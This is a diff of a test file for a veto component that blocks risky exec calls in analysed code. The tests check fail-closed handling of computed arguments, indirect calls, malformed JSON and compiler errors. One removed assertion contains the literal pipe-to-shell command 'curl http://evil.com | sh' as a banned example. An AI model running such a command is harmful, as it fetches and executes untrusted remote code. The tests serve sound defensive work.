-    _assert("decide banned verdict carries the literal command",
-        string.index_of(bverdict, "curl http://evil.com | sh") >= 0)
-    // a computed arg in the real shape → exec rule fail-closes through decide().
-    compargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"os_system\",\"args\":[{\"computed\":true}]}]}"
-    cv = decide(compargs, 0, roots, rules)
-    _vetoed("decide fail-closes on a computed exec arg via args[]", cv)
-    _assert("decide computed-exec verdict marks <computed-arg>",
-        string.index_of(cv, "<computed-arg>") >= 0)
+        // FAIL-CLOSED: non-zero aetherc exit → veto regardless of (absent) AST.
+        spec.it("fail-closes on non-zero emit exit") callback {
+            _vetoed(fw, "decide fail-closes on non-zero emit exit",
+                decide("", 1, roots, rules))
+        }
+        spec.it("fail-closes on emit exit even with clean-looking json") callback {
+            clean = "{\"nodes\":[{\"kind\":\"import_statement\",\"file\":\"/work/app.ae\",\"line\":1,\"module\":\"std.string\"},{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":3,\"callee\":\"string_concat\"}]}"
+            _vetoed(fw, "decide fail-closes on emit exit even with clean-looking json",
+                decide(clean, 2, roots, rules))
+        }
 
-    // FAIL-CLOSED: non-zero aetherc exit → veto regardless of (absent) AST.
-    _vetoed("decide fail-closes on non-zero emit exit",
-        decide("", 1, roots, rules))
-    _vetoed("decide fail-closes on emit exit even with clean-looking json",
-        decide(clean, 2, roots, rules))
+        // FAIL-CLOSED: malformed / non-AST JSON → veto.
+        spec.it("fail-closes on unparseable json") callback {
+            _vetoed(fw, "decide fail-closes on unparseable json",
+                decide("{not json", 0, roots, rules))
+        }
+        spec.it("fail-closes on json without nodes array") callback {
+            _vetoed(fw, "decide fail-closes on json without nodes array",
+                decide("{\"other\":1}", 0, roots, rules))
+        }
 
-    // FAIL-CLOSED: malformed / non-AST JSON → veto.
-    _vetoed("decide fail-closes on unparseable json",
-        decide("{not json", 0, roots, rules))
-    _vetoed("decide fail-closes on json without nodes array",
-        decide("{\"other\":1}", 0, roots, rules))
+        // indirect call in the AST → fail-closed veto.
+        spec.it("fail-closes on an indirect untrusted call") callback {
+            indirect = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":5,\"indirect\":true}]}"
+            _vetoed(fw, "decide fail-closes on an indirect untrusted call",
+                decide(indirect, 0, roots, rules))
+        }
+    }
 
-    // indirect call in the AST → fail-closed veto.
-    indirect = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":5,\"indirect\":true}]}"
-    _vetoed("decide fail-closes on an indirect untrusted call",
-        decide(indirect, 0, roots, rules))
-
-    println("veto decision-core tests done")
+    spec.run_summary(fw)
 }
